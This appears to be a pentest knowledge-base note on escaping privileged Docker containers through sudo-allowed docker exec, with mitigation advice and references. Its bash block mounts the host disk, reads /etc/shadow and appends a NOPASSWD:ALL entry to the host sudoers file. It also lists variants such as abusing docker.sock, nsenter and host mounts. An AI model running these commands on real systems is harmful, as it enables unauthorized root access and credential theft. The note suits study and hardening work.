---
topic: Docker privileged escape
tags: [linux, docker, privileged, container-escape, sudo, mount]
---

# Docker privileged escape

**English** | [🇪🇸 Español](docker-privileged-escape.md)

## Concept

A container run with `--privileged` receives broad capabilities and access to host devices. If a user can launch `docker exec --privileged` through `sudo`, they can mount the host disk and modify files outside the container, including `/etc/sudoers`.

## When it applies

- `sudo` rules allowing `docker exec` or `docker run`.
- Privileged containers already running.
- Access to the Docker socket.
- A host disk mounted or reachable as a block device.

## Procedure

1. Review `sudo -l` and available containers.
2. Confirm the container is privileged.
3. Identify the host partition with `lsblk` or `fdisk -l`.
4. Mount it inside the container.
5. Write to `/etc/sudoers` or extract credentials.

```bash
sudo -l
sudo docker ps
sudo docker exec --privileged <CONTAINER> sh -c 'lsblk; mount /dev/sda1 /mnt; cat /mnt/etc/shadow'
sudo docker exec --privileged <CONTAINER> sh -c 'echo "<USER> ALL=(ALL) NOPASSWD:ALL" >> /mnt/etc/sudoers'
```

## Variants

- Mounting the `/var/run/docker.sock` socket.
- `docker run -v /:/mnt --privileged` to mount the root.
- Abusing `--pid=host` or `--net=host`.
- Escaping through `nsenter` when namespaces are shared.

## Limitations

- Mounting may require the correct device name.
- SELinux or AppArmor can block writes.
- The container must still be running.
- A `sudo` rule limited to one container reduces the scope.

## Mitigation and detection

- Do not grant `docker` or `docker exec` to non-admin users.
- Avoid `--privileged` and host mounts.
- Use rootless Docker or pods without capabilities.
- Audit `sudo docker` commands, mounts and writes to `/etc/sudoers`.

## References

- <https://docs.docker.com/engine/security/>
- <https://attack.mitre.org/techniques/T1611/>
- <https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation.html>
